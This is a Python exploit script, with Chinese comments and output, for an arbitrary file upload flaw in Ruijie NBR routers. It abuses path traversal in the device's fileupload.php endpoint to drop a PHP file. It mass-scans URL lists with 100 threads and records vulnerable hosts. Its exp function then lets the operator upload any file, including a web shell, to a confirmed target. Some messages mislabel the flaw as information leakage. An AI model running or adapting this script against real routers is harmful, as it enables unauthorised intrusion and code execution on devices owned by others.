import requests
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    parser = argparse.ArgumentParser(description="锐捷 NBR 路由器任意文件上传漏洞复现")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/ddi/server/fileupload.php?uploadDir=../../321&name=123.php'
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    files = {
        'file': ('111.php', '<?php phpinfo();?>', 'image/jpeg')
    }
    try:
        res = requests.get(url=target, verify=False, timeout=10)
        if res.status_code == 200:
            response = requests.post(url=url, headers=headers, files=files, verify=False, timeout=10)
            if response.status_code == 200 and '123.php' in response.text:
                print(f"[+] 该网址存在信息泄露漏洞 {target}")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
                    return True
            else:
                print(f"[-] 该网址不存在信息泄露漏洞 {target}")
        else:
            print(f"[*] 无法访问目标 {target}")
    except Exception as e:
        print(e)
def exp(target):
    print("---------正在进行漏洞利用----------")
    while True:
        file = input('请输入你要上传的文件名,q退出>')
        code = input('请输入文件的内容：')
        if file == 'q':
            print("正在退出，请等候....")
            break
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
        }
        files = {
            'file': ('111.php', f'"{code}"', 'image/jpeg')
        }
        playload = f"/ddi/server/fileupload.php?uploadDir=../../321&name={file}"
        proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        try:
            response = requests.post(url=target+playload, headers=headers, files=files, proxies=proxies, verify=False, timeout=10)
            print(response.text)
            if response.status_code == 200 and "321" in response.text:
                print(f"上传成功！文件路径为{target}/321/{file}")
            else:
                print("不存在！")
        except Exception as e:
            print(e)


if __name__ == '__main__':
    main()
